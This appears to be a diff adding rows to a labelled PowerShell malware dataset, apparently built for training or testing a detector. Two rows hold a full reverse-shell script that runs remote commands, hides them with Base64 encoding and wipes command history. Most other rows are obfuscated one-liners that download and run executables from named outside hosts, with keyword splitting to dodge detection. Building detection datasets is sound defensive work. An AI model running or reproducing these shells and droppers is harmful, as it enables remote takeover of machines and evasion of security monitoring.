+Invoke-ReversePowerShell -Reverse -IpAddress 192.168.2.1 -Port 1337 -Obfuscate
+# This command example connects to port 1337 on remote machine 192.168.2.1. Any commands executed are obfuscated using Base64.
+
+.EXAMPLE
+Invoke-ReversePowerShell -Bind -IpAddress 192.168.2.1 -Port 1337 -Obfuscate -ClearHistory
+# This command example connects to bind port 1337 on remote machine 192.168.2.1. Any commands executed are obfuscated using Base64. The powershell command history is then attempted to be erased.
+
+
+.NOTES
+Author: Robert H. Osborne
+Alias: tobor
+Contact: rosborne@osbornepro.com
+
+
+.LINK
+https://osbornepro.com
+https://writeups.osbornepro.com
+https://btpssecpack.osbornepro.com
+https://github.com/tobor88
+https://gitlab.com/tobor88
+https://www.powershellgallery.com/profiles/tobor
+https://www.linkedin.com/in/roberthosborne/
+https://www.credly.com/users/roberthosborne/badges
+https://www.hackthebox.eu/profile/52286
+
+
+.INPUTS
+None
+
+
+.OUTPUTS
+None
+
+#>
+Function Invoke-ReversePowerShell {
+    [CmdletBinding(DefaultParameterSetName=""Reverse"")]
+        param(
+            [Parameter(
+                ParameterSetName=""Reverse"",
+                Mandatory=$True,
+                Position=0,
+                ValueFromPipeline=$True,
+                ValueFromPipelineByPropertyName=$True,
+                HelpMessage=""Enter the IP Address of the remote machine. Example: 10.10.14.21"")] # End Parameter
+            [Parameter(
+                ParameterSetName=""Bind"",
+                Mandatory=$True,
+                Position=0,
+                ValueFromPipeline=$True,
+                ValueFromPipelineByPropertyName=$True,
+                HelpMessage=""Enter the IP Address of the remote machine. Example: 10.10.14.21"")] # End Parameter
+            [ValidateNotNullorEmpty()]
+            [IPAddress]$IpAddress,
+
+            [Parameter(
+                ParameterSetName=""Reverse"",
+                Mandatory=$False,
+                Position=1,
+                ValueFromPipeline=$False,
+                HelpMessage=""Enter the port number the remote machine is listening on. Example: 1234"")] # End Parameter
+            [Parameter(
+                ParameterSetName=""Bind"",
+                Mandatory=$False,
+                Position=1,
+                ValueFromPipeline=$False,
+                HelpMessage=""Enter the port number the remote machine is listening on. Example: 1234"")] # End Parameter
+            [ValidateNotNullorEmpty()]
+            [ValidateRange(1,65535)]
+            [Int32]$Port = 1337,
+
+            [Parameter(
+                ParameterSetName=""Reverse"")]  # End Parameter
+            [Switch]$Reverse,
+
+            [Parameter(
+                ParameterSetName=""Bind"")]  # End Parameter
+            [Switch]$Bind,
+
+            [Parameter(
+                ParameterSetName=""Reverse"",
+                Mandatory=$False)]  # End Parameter
+            [Parameter(
+                ParameterSetName=""Bind"",
+                Mandatory=$False)]  # End Parameter
+            [Switch][Bool]$Obfuscate,
+
+            [Parameter(
+                ParameterSetName=""Reverse"",
+                Mandatory=$False)]  # End Parameter
+            [Parameter(
+                ParameterSetName=""Bind"",
+                Mandatory=$False)]  # End Parameter
+            [Alias(""C"",""Cls"",""Ch"",""Clear"")]
+            [Switch][Bool]$ClearHistory
+        ) # End param
+
+
+    Write-Verbose ""Creating a fun infinite loop. - The Shadow King (Amahl Farouk)""
+    $GodsMakeRules = ""They dont follow them""
+
+    While ($GodsMakeRules -eq 'They dont follow them')
+    {
+
+        Write-Verbose ""Default error action is being defined as Continue""
+        $ErrorActionPreference = 'Continue'
+
+        Try
+        {
+
+            Write-Output ""[*] Connection attempted. Check your listener.""
+
+            Switch ($PSCmdlet.ParameterSetName)
+            {
+
+            'Reverse' {
+
+                $Client = New-Object -TypeName System.Net.Sockets.TCPClient($IpAddress,$Port)
+                $Stream = $Client.GetStream()
+
+                [Byte[]]$Bytes = 0..255 | ForEach-Object -Process {0}
+                $SendBytes = ([Text.Encoding]::ASCII).GetBytes(""Welcome $env:USERNAME, you are now connected to $env:COMPUTERNAME ""+""`n`n"" + ""PS "" + (Get-Location).Path + ""> "")
+                $Stream.Write($SendBytes,0,$SendBytes.Length);$Stream.Flush()
+
+                While (($i = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0)
+                {
+
+                    $Command = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($Bytes,0, $i)
+
+                    If ($Command.StartsWith(""kill-link""))
+                    {
+
+                        If ($ClearHistory.IsPresent)
+                        {
+
+                            Write-Output ""[*] Attempting to clear command history""
+
+                            $CmdHistoryFiles = ""$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Visual Studio Code Host_history.txt"",""$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Windows PowerShell ISE Host_history.txt"",""$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt""
+
+                            Clear-History
+                            Clear-Content -Path $CmdHistoryFiles -Force -ErrorAction SilentlyContinue
+
+Set-PSReadlineOption –HistorySaveStyle SaveNothing
+
+                        }  # End If
+
+                        Write-Verbose ""Closing client connection""
+                        $Client.Close()
+                        Write-Verbose ""Client connection closed""
+                        Exit
+
+                    } # End If
+                    Try
+                    {
+
+                        # Executes commands
+                        If ($Obfuscate.IsPresent)
+                        {
+
+                            Write-Verbose ""Obfuscating command""
+
+                            $Base64Cmd = ([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(""$Command"")))
+                            $ExecuteCmd = PowerShell.exe -EncodedCommand $Base64Cmd -NoLogo -NoProfile -ExecutionPolicy Bypass | Out-String
+                            $ExecuteCmdAgain = $ExecuteCmd + ""PS "" + (Get-Location).Path + ""> ""
+
+                        }  # End If
+                        Else
+                        {
+
+                            $ExecuteCmd = &('Invoke-'+'Expression') -Command $Command 2>&1 | Out-String
+                            $ExecuteCmdAgain  = $ExecuteCmd + ""PS "" + (Get-Location).Path + ""> ""
+
+                        }  # End Else
+
+                    } # End Try
+                    Catch
+                    {
+
+                        $Error[0].ToString() + $Error[0].InvocationInfo.PositionMessage
+                        $ExecuteCmdAgain  =  ""ERROR: "" + $Error[0].ToString() + ""`n`n"" + ""PS "" + (Get-Location).Path + ""> ""
+
+                    } # End Catch
+
+                    $ReturnBytes = ([Text.Encoding]::ASCII).GetBytes($ExecuteCmdAgain)
+                    $Stream.Write($ReturnBytes,0,$ReturnBytes.Length)
+                    $Stream.Flush()
+
+                } # End While
+                $Client.Close()
+
+            }  # End Reverse Switch
+
+            'Bind' {
+
+            Write-Warning ""Sorry this is not there yet. I am still figuring this part out""
+            $Client = New-Object -TypeName System.Net.Sockets.TCPClient($IpAddress,$Port)
+            $Stream = $Client.GetStream()
+
+            While (($i = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0)
+            {
+
+                $ReturnBytes = ([Text.Encoding]::ASCII).GetBytes($Stream)
+                $Stream.Write($ReturnBytes,0,$ReturnBytes.Length)
+                $Stream.Flush()
+
+            } # End While
+
+            $Client.Close()
+
+            }  # End Bind Switch
+
+            }  # End Switch
+
+        } # End Try
+        Catch
+        {
+
+            Write-Output ""There was a connection error. Retrying occurs every 30 seconds""
+
+            Write-Verbose ""Client closing...""
+            $Client.Close()
+            Write-Verbose ""Client connection closed""
+
+            Write-Verbose ""Begining countdown timer to reestablish failed connection""
+            [Int]$Timer = 30
+            $Length = $Timer / 100
+
+            For ($Timer; $Timer -gt 0; $Timer--)
+            {
+
+                $Text = ""0:"" + ($Timer % 60) + "" seconds left""
+                Write-Progress -Activity ""Attempting to re-establish connection in: "" -Status $Text -PercentComplete ($Timer / $Length)
+                Start-Sleep -Seconds 1
+
+            }  # End For
+
+        } # End Catch
+
+    } # End While
+    $Client.Close()
+    If ($Listener)
+    {
+
+        $Listener.Stop()
+
+    }  # End If
+
+} # End Function Invoke-ReversePowerShell",-EncodedCommand,strict,parse_valid_and_invariants_ok
+variant_fabab212872a,seed_2ec1a3e97689,1afa55af7c4a24da8651d273202024889d5766637d58a73e93f28afebf013b37-obf-out-obfuscatedast__seed_2ec1a3e97689__invoke_expression_call_operator_string.ps1,malicious,BLOCK,invoke_expression_call_operator_string,execution_indirection,cross_runtime,1,Invoke-Expression,2,1,True,10114,10114,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,0fe9d172e728,320da7adf83b,"<#
+.SYNOPSIS
+This cmdlet is for connecting PowerShell to a listening port on a target machine.
+
+
+.DESCRIPTION
+Establishes a connection to a listening port on a remote machine effectively completing a reverse or bind shell.
+
+
+.PARAMETER IpAddress
+This parameter is for defining the IPv4 address to connect too on a remote machine. This cmdlet looks for a connection at this IP address on the remote host.
+
+.PARAMETER Port
+This parameter is for defining the listening port to attach to on a remote machine This cmdlet looks for a connection on a remote host using the port that you speficy here.
+
+.PARAMETER Reverse
+This switch parameter sets the Reverse parameter set value to be used. This is the default parameter set value and is not required.
+
+.PARAMETER Bind
+This switch paramter sets the Bind parameter set values to be used
+
+.PARAMETER Obfuscate
+This switch parameter is used to execute PowerShell commands using Base64 in an attempt to obfuscate logs.
+
+.PARAMETER ClearHistory
+This switch parameter is used to attempt clearing the PowerShell command history upon exiting a session.
+
+
+.EXAMPLE
+Invoke-ReversePowerShell -IpAddress 192.168.2.1 -Port 1234 -ClearHistory
+# This command example connects to port 1234 on remote machine 192.168.2.1 and clear the commands executed history afterwards.
+
+.EXAMPLE
+Invoke-ReversePowerShell -Reverse -IpAddress 192.168.2.1 -Port 1337 -Obfuscate
+# This command example connects to port 1337 on remote machine 192.168.2.1. Any commands executed are obfuscated using Base64.
+
+.EXAMPLE
+Invoke-ReversePowerShell -Bind -IpAddress 192.168.2.1 -Port 1337 -Obfuscate -ClearHistory
+# This command example connects to bind port 1337 on remote machine 192.168.2.1. Any commands executed are obfuscated using Base64. The powershell command history is then attempted to be erased.
+
+
+.NOTES
+Author: Robert H. Osborne
+Alias: tobor
+Contact: rosborne@osbornepro.com
+
+
+.LINK
+https://osbornepro.com
+https://writeups.osbornepro.com
+https://btpssecpack.osbornepro.com
+https://github.com/tobor88
+https://gitlab.com/tobor88
+https://www.powershellgallery.com/profiles/tobor
+https://www.linkedin.com/in/roberthosborne/
+https://www.credly.com/users/roberthosborne/badges
+https://www.hackthebox.eu/profile/52286
+
+
+.INPUTS
+None
+
+
+.OUTPUTS
+None
+
+#>
+Function Invoke-ReversePowerShell {
+    [CmdletBinding(DefaultParameterSetName=""Reverse"")]
+        param(
+            [Parameter(
+                Mandatory=$False,
+                ParameterSetName=""Reverse"")]  # End Parameter
+            [Parameter(
+                ParameterSetName=""Bind"",
+                Mandatory=$False)]  # End Parameter
+            [System.Management.Automation.SwitchParameter][System.Boolean]$Obfuscate,
+
+            [Parameter(
+                ParameterSetName=""Reverse"",
+                Mandatory=$False)]  # End Parameter
+            [Parameter(
+                ParameterSetName=""Bind"",
+                Mandatory=$False)]  # End Parameter
+            [Alias(""Cls"",""C"",""Ch"",""Clear"")]
+            [Switch][Boolean]$ClearHistory,
+
+            [Parameter(
+                Position=0,
+                ParameterSetName=""Reverse"",
+                ValueFromPipelineByPropertyName,
+                HelpMessage=""Enter the IP Address of the remote machine. Example: 10.10.14.21"",
+                ValueFromPipeline,
+                Mandatory)] # End Parameter
+            [Parameter(
+                ValueFromPipelineByPropertyName,
+                Position=0,
+                HelpMessage=""Enter the IP Address of the remote machine. Example: 10.10.14.21"",
+                Mandatory,
+                ParameterSetName=""Bind"",
+                ValueFromPipeline)] # End Parameter
+            [ValidateNotNullorEmpty()]
+            [Net.IPAddress]$IpAddress,
+
+            [Parameter(
+                ParameterSetName=""Bind"")]  # End Parameter
+            [Switch]$Bind,
+
+            [Parameter(
+                Mandatory=$False,
+                ParameterSetName=""Reverse"",
+                ValueFromPipeline=$False,
+                HelpMessage=""Enter the port number the remote machine is listening on. Example: 1234"",
+                Position=1)] # End Parameter
+            [Parameter(
+                Mandatory=$False,
+                ValueFromPipeline=$False,
+                ParameterSetName=""Bind"",
+                HelpMessage=""Enter the port number the remote machine is listening on. Example: 1234"",
+                Position=1)] # End Parameter
+            [ValidateNotNullorEmpty()]
+            [ValidateRange(1,65535)]
+            [Int32]$Port = 1337,
+
+            [Parameter(
+                ParameterSetName=""Reverse"")]  # End Parameter
+            [Switch]$Reverse
+        ) # End param
+
+
+    Write-Verbose ""Creating a fun infinite loop. - The Shadow King (Amahl Farouk)""
+    Set-Variable -Name GodsMakeRules -Value (""They dont follow them"")
+
+    While ($GodsMakeRules -eq 'They dont follow them')
+    {
+
+        Write-Verbose ""Default error action is being defined as Continue""
+        Set-Variable -Name ErrorActionPreference -Value ('Continue')
+
+        Try
+        {
+
+            Write-Output ""[*] Connection attempted. Check your listener.""
+
+            Switch ($PSCmdlet.ParameterSetName)
+            {
+
+            'Reverse' {
+
+                $Client = New-Object -TypeName System.Net.Sockets.TCPClient($IpAddress,$Port)
+                $Stream = $Client.GetStream()
+
+                [Byte[]]$Bytes = 0..255 | ForEach-Object -Process {0}
+                $SendBytes = ([Text.Encoding]::ASCII).GetBytes(""Welcome $env:USERNAME, you are now connected to $env:COMPUTERNAME ""+""`n`n"" + ""PS "" + (Get-Location).Path + ""> "")
+                $Stream.Write($SendBytes,0,$SendBytes.Length);$Stream.Flush()
+
+                While (($i = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0)
+                {
+
+                    $Command = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($Bytes,0, $i)
+
+                    If ($Command.StartsWith(""kill-link""))
+                    {
+
+                        If ($ClearHistory.IsPresent)
+                        {
+
+                            Write-Output ""[*] Attempting to clear command history""
+
+                            $CmdHistoryFiles = ""$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Visual Studio Code Host_history.txt"",""$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Windows PowerShell ISE Host_history.txt"",""$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt""
+
+                            Clear-History
+                            Clear-Content -Path $CmdHistoryFiles -Force -ErrorAction SilentlyContinue
+
+Set-PSReadlineOption –HistorySaveStyle SaveNothing
+
+                        }  # End If
+
+                        Write-Verbose ""Closing client connection""
+                        $Client.Close()
+                        Write-Verbose ""Client connection closed""
+                        Exit
+
+                    } # End If
+                    Try
+                    {
+
+                        # Executes commands
+                        If ($Obfuscate.IsPresent)
+                        {
+
+                            Write-Verbose ""Obfuscating command""
+
+                            $Base64Cmd = ([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(""$Command"")))
+                            $ExecuteCmd = PowerShell.exe -EncodedCommand $Base64Cmd -NoLogo -NoProfile -ExecutionPolicy Bypass | Out-String
+                            $ExecuteCmdAgain = $ExecuteCmd + ""PS "" + (Get-Location).Path + ""> ""
+
+                        }  # End If
+                        Else
+                        {
+
+                            $ExecuteCmd = &('Invoke-'+'Expression') -Command $Command 2>&1 | Out-String
+                            $ExecuteCmdAgain  = $ExecuteCmd + ""PS "" + (Get-Location).Path + ""> ""
+
+                        }  # End Else
+
+                    } # End Try
+                    Catch
+                    {
+
+                        $Error[0].ToString() + $Error[0].InvocationInfo.PositionMessage
+                        $ExecuteCmdAgain  =  ""ERROR: "" + $Error[0].ToString() + ""`n`n"" + ""PS "" + (Get-Location).Path + ""> ""
+
+                    } # End Catch
+
+                    $ReturnBytes = ([Text.Encoding]::ASCII).GetBytes($ExecuteCmdAgain)
+                    $Stream.Write($ReturnBytes,0,$ReturnBytes.Length)
+                    $Stream.Flush()
+
+                } # End While
+                $Client.Close()
+
+            }  # End Reverse Switch
+
+            'Bind' {
+
+            Write-Warning ""Sorry this is not there yet. I am still figuring this part out""
+            $Client = New-Object -TypeName System.Net.Sockets.TCPClient($IpAddress,$Port)
+            $Stream = $Client.GetStream()
+
+            While (($i = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0)
+            {
+
+                $ReturnBytes = ([Text.Encoding]::ASCII).GetBytes($Stream)
+                $Stream.Write($ReturnBytes,0,$ReturnBytes.Length)
+                $Stream.Flush()
+
+            } # End While
+
+            $Client.Close()
+
+            }  # End Bind Switch
+
+            }  # End Switch
+
+        } # End Try
+        Catch
+        {
+
+            Write-Output ""There was a connection error. Retrying occurs every 30 seconds""
+
+            Write-Verbose ""Client closing...""
+            $Client.Close()
+            Write-Verbose ""Client connection closed""
+
+            Write-Verbose ""Begining countdown timer to reestablish failed connection""
+            [Int32]$Timer = 30
+            Set-Variable -Name Length -Value ($Timer / 100)
+
+            For ($Timer; $Timer -gt 0; $Timer--)
+            {
+
+                Set-Variable -Name Text -Value (""0:"" + ($Timer % 60) + "" seconds left"")
+                Write-Progress -Status $Text -Activity ""Attempting to re-establish connection in: "" -PercentComplete ($Timer / $Length)
+                Start-Sleep -Seconds 1
+
+            }  # End For
+
+        } # End Catch
+
+    } # End While
+    $Client.Close()
+    If ($Listener)
+    {
+
+        $Listener.Stop()
+
+    }  # End If
+
+} # End Function Invoke-ReversePowerShell",-EncodedCommand,strict,parse_valid_and_invariants_ok
+variant_c81972b584ff,seed_deed4f58b70d,137__seed_deed4f58b70d__start_process_call_operator_string.ps1,malicious,BLOCK,start_process_call_operator_string,keyword_hiding,cross_runtime,1,Start-Process,3,2,True,118,118,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,bad906993e89,b9ec6c71fcf7,"(New-Object System.Net.WebClient).DownloadFile('http://cajos.in/0x/1.exe','mess.exe');&('Start-'+'Process') 'mess.exe'",DownloadFile,strict,parse_valid_and_invariants_ok
+variant_b79bc2dee7c4,seed_deed4f58b70d,137__seed_deed4f58b70d__downloadfile_psobject_invoke.ps1,malicious,BLOCK,downloadfile_psobject_invoke,string_construction,cross_runtime,2,DownloadFile,3,2,True,140,140,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,bad906993e89,fc1a70ef3670,"(New-Object System.Net.WebClient).PSObject.Methods['Download'+'File'].Invoke('http://cajos.in/0x/1.exe','mess.exe');Start-Process 'mess.exe'",DownloadFile,strict,parse_valid_and_invariants_ok
+variant_158855353586,seed_6f4b268bd776,bcd9fe7a98567679a87df68d07a1b9398df6db528abd28efe2336bc9f6fea7a7__seed_6f4b268bd776__start_process_call_operator_string.ps1,malicious,BLOCK,start_process_call_operator_string,keyword_hiding,cross_runtime,1,Start-Process,3,2,True,121,121,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,c33aa5e6561b,ad7ee6228afc,"(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/aba.exe','mess.exe');&('Start-'+'Process') 'mess.exe'",DownloadFile,strict,parse_valid_and_invariants_ok
+variant_1f0f1e17dd8b,seed_6f4b268bd776,bcd9fe7a98567679a87df68d07a1b9398df6db528abd28efe2336bc9f6fea7a7__seed_6f4b268bd776__downloadfile_psobject_invoke.ps1,malicious,BLOCK,downloadfile_psobject_invoke,string_construction,cross_runtime,2,DownloadFile,3,2,True,143,143,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,c33aa5e6561b,a5830f99ec64,"(New-Object System.Net.WebClient).PSObject.Methods['Download'+'File'].Invoke('http://worldnit.com/aba.exe','mess.exe');Start-Process 'mess.exe'",DownloadFile,strict,parse_valid_and_invariants_ok
+variant_4424d956f84a,seed_a95975b607c4,fec6779d4d6bd700f980dd3c7dfcb3c20665c15d4731e69e8576c1b43b898384__seed_a95975b607c4__start_process_call_operator_string.ps1,malicious,BLOCK,start_process_call_operator_string,keyword_hiding,cross_runtime,1,Start-Process,3,2,True,121,121,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,f17e52e4605d,bba1565f2890,"(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/com.exe','mess.exe');&('Start-'+'Process') 'mess.exe'",DownloadFile,strict,parse_valid_and_invariants_ok
+variant_f442c7a73641,seed_a95975b607c4,fec6779d4d6bd700f980dd3c7dfcb3c20665c15d4731e69e8576c1b43b898384__seed_a95975b607c4__downloadfile_psobject_invoke.ps1,malicious,BLOCK,downloadfile_psobject_invoke,string_construction,cross_runtime,2,DownloadFile,3,2,True,143,143,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,f17e52e4605d,bc6ddf1ac39a,"(New-Object System.Net.WebClient).PSObject.Methods['Download'+'File'].Invoke('http://worldnit.com/com.exe','mess.exe');Start-Process 'mess.exe'",DownloadFile,strict,parse_valid_and_invariants_ok
+variant_4c82e5454619,seed_15b1474c517d,34dcf2a22fa7555de2ab95c3d8ab5605de01345b8d741491e1907ecd50a5ea1f__seed_15b1474c517d__start_process_call_operator_string.ps1,malicious,BLOCK,start_process_call_operator_string,keyword_hiding,cross_runtime,1,Start-Process,3,2,True,122,122,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,4458523ddb38,8a8a2735dc77,"(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/igbo.exe','mess.exe');&('Start-'+'Process') 'mess.exe'",DownloadFile,strict,parse_valid_and_invariants_ok
+variant_5614aa5102cc,seed_15b1474c517d,34dcf2a22fa7555de2ab95c3d8ab5605de01345b8d741491e1907ecd50a5ea1f__seed_15b1474c517d__downloadfile_psobject_invoke.ps1,malicious,BLOCK,downloadfile_psobject_invoke,string_construction,cross_runtime,2,DownloadFile,3,2,True,144,144,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,4458523ddb38,53ed6a9f5c55,"(New-Object System.Net.WebClient).PSObject.Methods['Download'+'File'].Invoke('http://worldnit.com/igbo.exe','mess.exe');Start-Process 'mess.exe'",DownloadFile,strict,parse_valid_and_invariants_ok
+variant_1097893333be,seed_a2a9f5be9c2a,fef9fdbb642fd0bebbc11aca6676ed8532eb3a5dd1c71eb38a260d4b21f9aaae__seed_a2a9f5be9c2a__start_process_call_operator_string.ps1,malicious,BLOCK,start_process_call_operator_string,keyword_hiding,cross_runtime,1,Start-Process,3,2,True,122,122,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,9c3922f39fdf,87ba3b2e4f92,"(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/immo.exe','mess.exe');&('Start-'+'Process') 'mess.exe'",DownloadFile,strict,parse_valid_and_invariants_ok
+variant_0019c4948215,seed_a2a9f5be9c2a,fef9fdbb642fd0bebbc11aca6676ed8532eb3a5dd1c71eb38a260d4b21f9aaae__seed_a2a9f5be9c2a__downloadfile_psobject_invoke.ps1,malicious,BLOCK,downloadfile_psobject_invoke,string_construction,cross_runtime,2,DownloadFile,3,2,True,144,144,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,9c3922f39fdf,8c9cd5bc26d7,"(New-Object System.Net.WebClient).PSObject.Methods['Download'+'File'].Invoke('http://worldnit.com/immo.exe','mess.exe');Start-Process 'mess.exe'",DownloadFile,strict,parse_valid_and_invariants_ok
+variant_5d22f796740d,seed_499ee93d35bf,1927__seed_499ee93d35bf__start_process_call_operator_string.ps1,malicious,BLOCK,start_process_call_operator_string,keyword_hiding,cross_runtime,1,Start-Process,3,2,True,123,123,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,0a692930aba2,d4a5cf57ea1a,"(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/nigga.exe','mess.exe');&('Start-'+'Process') 'mess.exe'",DownloadFile,strict,parse_valid_and_invariants_ok
+variant_e81227f5ae5d,seed_499ee93d35bf,1927__seed_499ee93d35bf__downloadfile_psobject_invoke.ps1,malicious,BLOCK,downloadfile_psobject_invoke,string_construction,cross_runtime,2,DownloadFile,3,2,True,145,145,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,0a692930aba2,76ad7c1431a6,"(New-Object System.Net.WebClient).PSObject.Methods['Download'+'File'].Invoke('http://worldnit.com/nigga.exe','mess.exe');Start-Process 'mess.exe'",DownloadFile,strict,parse_valid_and_invariants_ok
+variant_03ef65f8676b,seed_0c54b17ebe6b,0f5e36a549a4ec6e0605f7310205ebdd5141c532959bd9bf5ee25f06560e7c18__seed_0c54b17ebe6b__start_process_call_operator_string.ps1,malicious,BLOCK,start_process_call_operator_string,keyword_hiding,cross_runtime,1,Start-Process,3,2,True,123,123,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,fa28fb0d8533,6a337843b647,"(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/kells.exe','mess.exe');&('Start-'+'Process') 'mess.exe'",DownloadFile,strict,parse_valid_and_invariants_ok
+variant_5f29ebb9ebc4,seed_0c54b17ebe6b,0f5e36a549a4ec6e0605f7310205ebdd5141c532959bd9bf5ee25f06560e7c18__seed_0c54b17ebe6b__downloadfile_psobject_invoke.ps1,malicious,BLOCK,downloadfile_psobject_invoke,string_construction,cross_runtime,2,DownloadFile,3,2,True,145,145,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,fa28fb0d8533,c3d5ebe253b6,"(New-Object System.Net.WebClient).PSObject.Methods['Download'+'File'].Invoke('http://worldnit.com/kells.exe','mess.exe');Start-Process 'mess.exe'",DownloadFile,strict,parse_valid_and_invariants_ok
+variant_71dd840c5b0d,seed_e8225ca71fe4,17dcaeeb7d93c8bc0150f4e1b471d81dd003be37bbaa6d2edf612dfb6a357dbc__seed_e8225ca71fe4__start_process_call_operator_string.ps1,malicious,BLOCK,start_process_call_operator_string,keyword_hiding,cross_runtime,1,Start-Process,3,2,True,123,123,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,057369a13f87,2c71ed9b6e40,"(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/kelle.exe','mess.exe');&('Start-'+'Process') 'mess.exe'",DownloadFile,strict,parse_valid_and_invariants_ok
+variant_0b864ce5a9e6,seed_e8225ca71fe4,17dcaeeb7d93c8bc0150f4e1b471d81dd003be37bbaa6d2edf612dfb6a357dbc__seed_e8225ca71fe4__downloadfile_psobject_invoke.ps1,malicious,BLOCK,downloadfile_psobject_invoke,string_construction,cross_runtime,2,DownloadFile,3,2,True,145,145,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,057369a13f87,7afbd68d826f,"(New-Object System.Net.WebClient).PSObject.Methods['Download'+'File'].Invoke('http://worldnit.com/kelle.exe','mess.exe');Start-Process 'mess.exe'",DownloadFile,strict,parse_valid_and_invariants_ok
+variant_0db057be483e,seed_09659d17cb23,450__seed_09659d17cb23__iex_call_operator_string.ps1,malicious,BLOCK,iex_call_operator_string,execution_indirection,cross_runtime,1,IEX,3,2,True,83,83,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,afb3bc0d2089,36695daf7f0d,&('I'+'EX') (new-object net.webclient).downloadstring('https://invesco.online/aaa'),DownloadString,strict,parse_valid_and_invariants_ok
+variant_6e8eec7f2d21,seed_09659d17cb23,450__seed_09659d17cb23__iex_scriptblock_create.ps1,malicious,BLOCK,iex_scriptblock_create,execution_indirection,cross_runtime,2,IEX,3,2,True,97,97,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,afb3bc0d2089,317acfd7d5b6,&([scriptblock]::Create((new-object net.webclient).downloadstring('https://invesco.online/aaa'))),DownloadString,strict,parse_valid_and_invariants_ok
+variant_3812d4a81b64,seed_09659d17cb23,450__seed_09659d17cb23__downloadstring_psobject_invoke.ps1,malicious,BLOCK,downloadstring_psobject_invoke,string_construction,cross_runtime,3,DownloadString,3,2,True,105,105,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,afb3bc0d2089,2b7e720a99c4,iex (new-object net.webclient).PSObject.Methods['Download'+'String'].Invoke('https://invesco.online/aaa'),DownloadString,strict,parse_valid_and_invariants_ok
+variant_3e5ae6c5b958,seed_66f8f0994bce,3062__seed_66f8f0994bce__iex_call_operator_string.ps1,malicious,BLOCK,iex_call_operator_string,execution_indirection,cross_runtime,1,IEX,3,2,True,86,86,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,571c12b307c4,093847197bfe,&('I'+'EX') ((New-Object Net.WebClient).DownloadString('http://93.171.205.35:8080/'));,DownloadString,strict,parse_valid_and_invariants_ok
+variant_a18502c68d83,seed_66f8f0994bce,3062__seed_66f8f0994bce__iex_scriptblock_create.ps1,malicious,BLOCK,iex_scriptblock_create,execution_indirection,cross_runtime,2,IEX,3,2,True,100,100,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,571c12b307c4,b6ff70f06496,&([scriptblock]::Create(((New-Object Net.WebClient).DownloadString('http://93.171.205.35:8080/'))));,DownloadString,strict,parse_valid_and_invariants_ok
+variant_97375a618a00,seed_66f8f0994bce,3062__seed_66f8f0994bce__downloadstring_psobject_invoke.ps1,malicious,BLOCK,downloadstring_psobject_invoke,string_construction,cross_runtime,3,DownloadString,3,2,True,108,108,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,571c12b307c4,d0b727dbd914,IEX ((New-Object Net.WebClient).PSObject.Methods['Download'+'String'].Invoke('http://93.171.205.35:8080/'));,DownloadString,strict,parse_valid_and_invariants_ok
